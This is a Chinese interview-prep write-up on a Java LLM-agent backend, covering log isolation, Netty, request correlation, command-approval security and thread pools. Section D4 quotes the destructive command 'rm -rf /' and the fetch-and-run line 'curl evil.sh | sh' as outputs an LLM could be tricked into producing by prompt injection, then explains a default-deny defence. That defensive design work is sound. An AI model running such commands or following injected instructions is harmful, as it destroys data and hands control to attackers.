## D1. 日志串线：用什么隔离的？ThreadLocal？MDC？

**Q：你简历写"避免并发请求下日志串线"，用什么隔离的？并行节点 fan-out 到子线程后，MDC / InheritableThreadLocal 的问题你怎么解决？用了 TTL 吗？**

### A：面试回答

都不是。日志隔离我用的既不是 MDC 也不是 ThreadLocal，而是**把上下文绑在请求自己的对象上**。

背景是这样：我的流式对话页面要把 Agent 执行过程里的模型调用、工具调用日志实时推回前端对应的那条流。最初的做法是全局注册一个日志插件，所有并发请求共享——这样 A 请求的日志就会推进 B 请求的流里，这就是串线问题。本质上是**全局单例 + 共享输出通道，并发下没有隔离边界**。

所以我的做法是：每个流式请求进来时，不去动全局注册的 Agent 配置，而是复制一份插件列表，创建一个**只属于这次请求的日志插件实例**，把 requestId 作为构造参数直接注入这个对象。插件在回调里把日志交给推送组件，推送组件拿 requestId 找到对应的 HTTP 连接。这样日志的路由跟执行线程完全无关，只跟"这次请求"绑定。

为什么不用 ThreadLocal 或 MDC？因为我的执行链是响应式流，事件回调不一定在提交请求的那个线程上执行，并行工作流还会 fan-out 到别的线程。MDC 底层就是 ThreadLocal，子线程拿不到；InheritableThreadLocal 看着能解决，但它的继承发生在**线程创建时**，而我面对的是线程池——线程是复用的，创建时机和任务提交完全脱钩，结果就是线程上残留着它第一次执行的那个请求的 ID，后面所有请求的日志都打错标。这比丢上下文更糟，因为它会误导排障。所以我的原则是：**请求状态跟着对象走，不跟着线程走**，对象是谁的就是谁的，天然免疫线程切换。

要说边界的话：项目里有一处确实用了普通 ThreadLocal——命令审批的执行上下文，因为它要穿过框架内部传到工具层，中间没有我能挂载的对象引用点。这个方案的前提是执行链**同线程闭合**，我用日志验证过当前链路成立，并且做了防御：工具读不到上下文时安全失败、直接拒绝执行，绝不会拿错别人的 requestId。如果以后要在并行分支里挂 shell 工具，那个方案就得换成 TTL，或者在 fan-out 前显式捕获上下文、随任务传递。

### 回答背后的核心逻辑

面试官预设的答案是 ThreadLocal/MDC/TTL 三选一，这道题考的是你懂不懂线程上下文传播。真实方案（对象绑定）是**比 TTL 更高一层的设计**——直接消解了问题而不是解决它。先破题（"都不是"），再给方案，最后主动把 ThreadLocal 那部分和 TTL 作为边界补上，等于把面试官准备好的追问弹药先缴械了。

### 面试官可能继续追问

1. "你那个推送组件是怎么按 requestId 找到连接的？"——内存注册表 `ConcurrentHashMap<requestId, Emitter>`，流结束/超时/异常时统一清理。
2. "RxJava 回调不是也可能切线程吗，你的 ThreadLocal 为什么现在能用？"——因为订阅后事件在提交任务的线程上串行执行，这条链验证过；前提写进了代码注释。
3. "TTL 原理知道吗？"——见下。

### 如果面试官继续深入

> TTL 的核心是"任务提交时捕获 + 任务执行时重放"：用 `TtlRunnable.get()` 包装任务，提交那一刻把父线程的 ThreadLocal 值拷进包装对象，任务在池里线程上真正跑的时候，先把快照回放到当前线程，执行完再还原。它解决的就是 InheritableThreadLocal "继承一次、永久残留"的问题，因为它的传播时机是**任务边界**而不是线程生命周期。我的场景里更干净的做法是连 TTL 都不用——requestId 已经是插件的不可变字段，fan-out 到哪个线程，那个回调对象持有的还是同一个 ID。

## D2. 为什么是 Netty？EventLoop 上有没有阻塞？

**Q：远程命令调用这条链路，可选方案至少有 HTTP 短轮询、WebSocket、gRPC、Netty 裸协议，你选 Netty 的具体理由是什么？EventLoopGroup 怎么配的？有没有在 EventLoop 线程里做阻塞操作？**

### A：面试回答

先说选型理由。这条链路的核心需求是**服务端主动把命令推给远程客户端**：客户端跑在内网或受控机器上的 Python 脚本，由它主动连进来建立长连接，之后我随时下发命令、它回传结果——典型的双向推送加长连接复用。对比其他方案：HTTP 短轮询要客户端不停拉，延迟和空转都不行；gRPC 双向流能做，但要引入 proto 和 HTTP/2，对我这个"换行分隔 JSON + 请求 ID"的极简协议来说太重了；WebSocket 也可以，但裸 TCP 加行协议对 Python 客户端来说实现最简单。当然我也诚实说，当前的客户端规模是个位数，性能不是选 Netty 的理由，**连接模型**才是；顺便也想在真实场景里练一下 Netty。

EventLoopGroup 的配置：boss 1 个线程，worker 用 Netty 默认值，也就是 CPU 核数乘 2。pipeline 里挂了 `LineBasedFrameDecoder` 解决粘包拆包，帧上限 5MB，然后是 UTF-8 的字符串编解码和业务 handler。

关于阻塞——没有，而且我是刻意保证的。handler 收到响应只做两件事：JSON 反序列化、然后 complete 对应的 CompletableFuture，都是微秒级操作。真正的等待，`future.get(30, TimeUnit.SECONDS)`，发生在**调用方线程**上，也就是 Agent 的业务执行线程，不在 EventLoop 上。所以就算远程客户端 30 秒不回，卡住的也只是那个业务线程，worker 上其他所有连接的读写完全不受影响。Netty 那条军规——不要在 EventLoop 上阻塞——我的架构里天然满足，因为 EventLoop 只做协议层的事，业务等待全部下沉到了 CompletableFuture 的调用侧。

### 回答背后的核心逻辑

这题有三个坑：选型理由（不能只说"快"）、线程模型配置、EventLoop 阻塞。代码里"future.get 在调用方线程"这一点是真的设计对了，而且能讲出"阻塞位置在调用侧而非事件循环"这个因果链。诚实地承认"客户端个位数、性能不是理由"反而加分，因为说明你知道选型是按需求来的。

### 面试官可能继续追问

1. "为什么不用 `EventExecutorGroup` 单独隔离业务 handler？"——当前 handler 无阻塞，不需要；如果以后在 channelRead 里加重逻辑，再挂 `DefaultEventExecutorGroup`。
2. "boss 为什么是 1？"——boss 只处理 accept，单线程足够，这是 Netty 惯例。
3. "粘包拆包为什么用行解码器？"——协议是文本行 JSON，最简单可靠；二进制协议才需要 LengthFieldBasedFrameDecoder。

### 如果面试官继续深入

> 如果假设我犯了错——比如在 `channelRead0` 里直接 `future.get()` 等 Agent 处理完——会发生什么：每个 worker 线程默认挂几百个 channel，一个 EventLoop 卡 30 秒，它负责的所有连接在这 30 秒内读写全部停摆，心跳超时、批量掉线。修法有两个方向：轻量业务直接 `ctx.channel().eventLoop().execute()` 排回事件循环做；重业务挂 `pipeline.addLast(businessGroup, handler)`，Netty 会把 handler 的回调调度到独立的 EventExecutorGroup 上，EventLoop 只负责 IO。我的实现选择的是第三种：EventLoop 里根本不做业务，只完成 Future，把阻塞留给业务线程自己承担。

## D3. 请求-响应关联与内存泄漏

**Q：长连接上多个请求复用同一条 channel，响应异步乱序返回。你怎么把入站帧关联回等待中的调用方？客户端永远不返回响应，map 里的 entry 会怎样？有没有超时清理？堆内存观测过吗？**

### A：面试回答

关联机制就是 correlationId 那种：每条命令生成一个 UUID 请求 ID，随命令一起发给客户端；同时在服务端一个 `ConcurrentHashMap<requestId, CompletableFuture>` 里登记一个 future。响应回来按 ID 从 map 里 **remove 并 complete**——先 remove 再 complete，保证就算客户端重复回包，也只有第一个响应生效，后来的 remove 返回 null，打条 warn 日志丢弃。

超时清理是有的：`future.get(30, TimeUnit.SECONDS)`，超时或发送异常都会在 catch 里把 entry 从 map 里 remove 掉再抛异常。所以这个 map 里的 entry 生命周期上界就是 30 秒，不会无界增长。另外还有一张连接表，按客户端 IP 存 channel，连接断开时移除；它的边界是同 IP 重连会覆盖旧 channel，旧 channel 上 pending 的请求会自然走到 30 秒超时，同样有界。

堆内存观测这个问题，我诚实回答：没有做过系统性的堆观测，项目没接 metrics。我的信心来自结构而不是数据——所有内存态容器（pending 请求表、连接表、审批记录、流式 Emitter 注册表）都有明确的移除路径：超时、断连或流结束三选一，必然触发。但我知道正确的做法是什么：`jstat -gcutil` 看 GC 频率和老年代增长趋势，`jmap` heapdump 或者 JFR 看支配树，重点盯那几个 ConcurrentHashMap 的 size——因为它们是逻辑上无界的结构，唯一的安全边界就是清理逻辑本身，这正是最该上监控的地方。

### 回答背后的核心逻辑

面试官这题考三件事：correlation 模式（UUID + map + future，标准答案）、超时清理意识（有，且"先 remove 再 complete"这个细节能体现并发功底）、以及诚实度。堆观测那问，"没观测过但知道怎么观测"是唯一正确姿势——恰好是这个状态，就直说。

### 面试官可能继续追问

1. "为什么先 remove 再 complete，反过来会怎样？"——先 complete 再 remove 的话，完成回调里如果又发起同 ID 请求（理论上），会读到旧 future；更重要的是 remove-and-complete 原子化保证 exactly-once 消费。
2. "如果 map 的 key 泄漏在别处呢，比如 requestId 重复？"——UUID 碰撞概率忽略；真正风险是 put 了但 get 之前连接就断了——断连只清 channel 不清 pending，但 30 秒超时兜底。
3. "怎么从工程上证明没有泄漏？"——压测 10 万次命令后看 map size 是否归零，或直接注册一个定时任务 dump size。

### 如果面试官继续深入

> 更严格的做法是不等 `get()` 的异常路径，而是 `future.orTimeout(30, SECONDS)` 加 `whenComplete((r, e) -> pendingResponses.remove(id))`，把清理和 future 生命周期绑死，不依赖调用方记得写 catch。再进一步，如果 pending 数量要防御性兜底，可以加一个定时扫描：清理所有 `createdAt + timeout < now` 的孤儿条目。当前实现依赖调用方 catch 清理，路径是闭合的，但"清理逻辑绑定在 future 自身"是更不容易被改坏的写法。

## D4. 审批执行的安全边界

**Q：被执行的命令字符串是大模型生成的，那这就是一个任意命令执行面——LLM 被 prompt injection 诱导生成 `rm -rf /` 或 `curl evil.sh | sh`，你的审批环节能拦住吗？审批 UI 展示的是完整原始命令还是 LLM 的意图描述？审批超时怎么办？占不占连接和线程？**

### A：面试回答

对，命令字符串就是大模型生成的工具调用参数——所以我从第一天就没把审批当第一道防线，否则 LLM 被诱导生成的恶意命令，只要骗过一次用户点击就出去了。我的设计是审批前面还有**静态策略审查，默认拒绝**，一共三层。

第一层是解析加白名单。命令先过一个自写的解析器：管道符、重定向、反引号、`$()` 命令替换、花括号、`&`、引号不闭合、控制字符——出现任何无法安全解析的结构，直接 Forbidden；然后按 `&&`、`||`、`;` 拆成子命令，每个子命令的可执行文件名和参数都要命中"允许规则"或"审批规则"的前缀匹配，一条没命中，整体默认拒绝；`rm` 这类执行器是硬编码拉黑的，不管参数是什么；命令长度有上限；远程命令的 host 必须在白名单里，local 命令甚至不允许带 host 字段。所以你说的 `curl evil.sh | sh` 在第一层就死了——`|` 直接禁；`rm -rf /` 也是——`rm` 拉黑；就算是个没见过的干净命令，没命中规则同样是默认拒绝。复合命令取最严决策：任一子命令 Forbidden，整体 Forbidden，而且 **Forbidden 不能被审批绕过**——审批只能放行 Prompt 级的命令。

第二层才是交互审批。用户看到的不是 LLM 的意图描述，是**脱敏后的完整原始命令**——token、密码、secret 会打码，但命令本身一个字不少，同时展示命令类型和目标 host。而且为了防"用户批的是 A、实际执行的是 B"，审批记录里存了命令快照的摘要，批准之后执行之前会重新比对摘要，不一致就拒绝执行——这样即使等待期间模型或上游篡改了命令内容，也过不去。

第三层是批准后的二次审查：比如用户等待审批的这几十秒里 host 白名单变了，重新过一遍策略。

超时的处理：默认 60 秒、上限可配 300 秒，超时状态迁移到 EXPIRED，命令不执行。占用方面，等待发生在 Agent 的后台执行线程上——流式响应早已经返回前端了，不占 HTTP 线程也不占 Netty 的 EventLoop；占用的是一个后台线程最多一个超时周期。而且流式连接断开或结束时，这个请求下所有未决审批统一转 CANCELLED 并清理，不会留悬挂记录。状态迁移全部走 CAS，从 PENDING 只能原子迁移到四个终态（APPROVED/REJECTED/EXPIRED/CANCELLED）之一，重复点击、并发提交都不会改变已确定的终态。

最后主动交代边界：这个审批是一次性的用户决定，**不是授权机制**——当前系统没有后端认证，任何拿到 requestId 加 approvalId 的人都能点批准。所以这套设计的前提是部署在受信网络；真上生产，认证和授权必须先补。

### 回答背后的核心逻辑

面试官的陷阱是让你以为"审批 = 安全"，然后追问 prompt injection 一击致命。真实实现恰好是"审批是第二层，静态默认拒绝才是第一层"，而且 `|`、`$()` 全禁 + 拉黑 rm + 前缀白名单 + 快照摘要防篡改，每一环都真实存在于 `CommandPolicyReviewer` 和 `CommandApprovalService` 里。最后主动说"审批不是授权"，把最大的洞自己捅破——这比被捅破好十倍。

### 面试官可能继续追问

1. "白名单前缀匹配怎么防止参数注入，比如允许了 `git`，但参数里带恶意值？"——规则匹配的是 token 序列前缀，可以匹配到参数级别（规则 token 多于命令则不匹配）；另外输出也有 max-output-chars 截断。
2. "审批等待期间，用户断开浏览器会怎样？"——Emitter 的 onCompletion/onTimeout/onError 统一触发清理，未决审批 CANCELLED，等待线程的 Future 被 complete 唤醒，不会悬挂。
3. "为什么不用沙箱（容器/seccomp）执行命令？"——见下。

### 如果面试官继续深入

> 更彻底的方案是执行隔离：命令不落在宿主 shell，而是丢进一次性容器，配 CPU/内存/网络策略和只读文件系统，审批降级为 UX 层面的确认。当前实现是长驻 shell 进程加同步锁，因为场景是内部工具、受控命令集，策略层的解析白名单在当前信任边界内够用。但我知道它的理论强度：解析器是自己写的，就有被绕过的可能——比如引号处理死角。所以工程上的兜底是把默认拒绝做绝对：**不是命中黑名单才拒绝，而是不命中白名单就拒绝**，未知命令的默认归宿是 Forbidden，这让"绕过解析器"的收益变成零，因为绕过之后还是没命中允许规则。

## D5. 并行与循环节点的资源边界

**Q：并行节点的线程池核心数、最大数、队列类型与容量、拒绝策略分别是多少？怎么定的？并行分支失败是 fail-fast 还是 all-of？有没有总超时？循环节点最大迭代次数多少，触发上限后怎么退出、怎么向用户交代？**

### A：面试回答

先交代背景。串行、并行、循环是我 Agent 编排层支持的三种工作流策略，由 YAML 配置驱动装配。默认入口是串行的"分析→绘图→审查"；并行用于同一需求生成多版图形方案——几个分支各自调模型出方案再汇总，墙钟时间约等于最慢那个分支，而不是所有分支之和，这就是简历里"提升多任务处理效率"的意思；循环用于按审查意见迭代优化图形。

线程池这个问题我分两层诚实回答。应用自己配了一个业务线程池：核心 20、最大 50、LinkedBlockingQueue 容量 5000、AbortPolicy 拒绝。但这些数字是脚手架模板值，不是按"并行分支数 × 单分支耗时 × 目标吞吐"算出来的——我也知道该按什么算：分支数决定并发需求上限；单分支耗时是秒级的 LLM 调用，决定每个线程的占用时长；两者乘上目标并发请求数就是池容量。而且这个量级下真正的瓶颈不在本地线程池，在**外部模型的并发配额**——本地开 50 个线程同时打模型，模型侧限流先到。所以理性的做法是线程池尺寸对齐模型供应商的 RPM 配额。

更诚实的一层：并行分支的实际执行线程目前由 Agent 框架内部管理——它用响应式流组合子把子 Agent 的事件流并发合并，我没有为它配置独立线程池，也**没有做分支级超时**。一个分支卡死，整个并行组会一直等到上层流式接口的 20 分钟总超时。这是我明确知道的边界，改进方向是给并行组加总超时和 fail-fast——一个分支失败就取消其余分支、把错误汇总给上层。

循环是有硬上限的：maxIterations 从配置读，默认 3，默认配置里的循环优化工作流就设了 3 次。到上限后循环节点直接结束，把最后一轮的产出作为工作流结果往下游走。这个保护必须有，因为 LLM 驱动的循环没有自然终止条件——模型每一轮都可能觉得"还没改好"，没有上限就会无限烧 token。上限触发后对用户的交代就是：按当前产出返回，工作流正常完成，不做特殊标记——这是可以改进的点，比如在结果里标注"已达到迭代上限"。

还有一个主动要说的缺口：流式执行目前用的是 `CompletableFuture.runAsync` 的默认 common pool，没有传上面那个业务线程池——意味着配置的队列上限和拒绝策略对流式任务不生效，而且等待审批时会占住 common pool 的线程。这是我记着要改的点：把 `runAsync(task, executor)` 传进去，一行改动，但改之前要重新验证命令审批的 ThreadLocal 链路（执行线程从 common pool 换成业务池，链路仍是同线程闭合的，但要重新验证而不是想当然）。

### 回答背后的核心逻辑

面试官明确说了"这是第二次，也是最后一次"——他在考会不会**拍数字**以及敢不敢承认没算过。牌面其实不差：数字真实存在（20/50/5000/AbortPolicy）、循环上限真实存在（maxIterations=3）、瓶颈判断（模型配额 > 本地线程池）是真的工程认知。短板是并行分支无独立线程池、无分支级总超时、流式用 common pool——全部主动交代，并给出改进方向和改动代价（一行 + 重新验证），这比硬编一个"我算过"安全得多。

### 面试官可能继续追问

1. "循环上限 3 是怎么定的？"——经验值：绘图场景三轮内质量收敛明显，第四轮边际收益低；本质是成本-质量折中，应该按评测调。
2. "fail-fast 要怎么实现？"——并行组外层加 `timeout` 算子或 `Future` 总控，某分支 error 时 dispose 其余分支的订阅；RxJava 里就是 `merge` 的 error 语义配合 `takeUntil`。
3. "common pool 被审批占满会怎样？"——common pool 是 JVM 全局共享的，并行度是 CPU 核数-1，被 60 秒级的阻塞占住会影响所有用 common pool 的组件（并行流、其他 runAsync）——这正是必须换专用池的原因。

### 如果面试官继续深入

> 换专用池之后的完整推导：池容量 N，每个流式任务占用线程的最坏时长 = Agent 总执行时间，含 LLM 调用（秒级）+ 工具调用（本地命令 + 远程命令 30 秒上界）+ 审批等待（60 秒上界）≈ 2 分钟量级。队列 5000 在这个占用时长下意味着最坏排队 5000×2min——对交互式请求完全不可接受，用户早刷新页面了。所以对流式这种长占用任务，正确的形状是小池子 + 小队列 + 快速拒绝（AbortPolicy），拒绝后立刻给用户"系统繁忙"而不是排队；大队列只适合短任务批处理。这也解释了为什么 `keepAliveTime` 配了 5000 而代码单位是**秒**——5000 秒约等于线程常驻，按当前配置语义，非核心线程实际上不会被回收，这大概率是把毫秒值当秒填了，是 review 自己配置时会抓出来的问题。
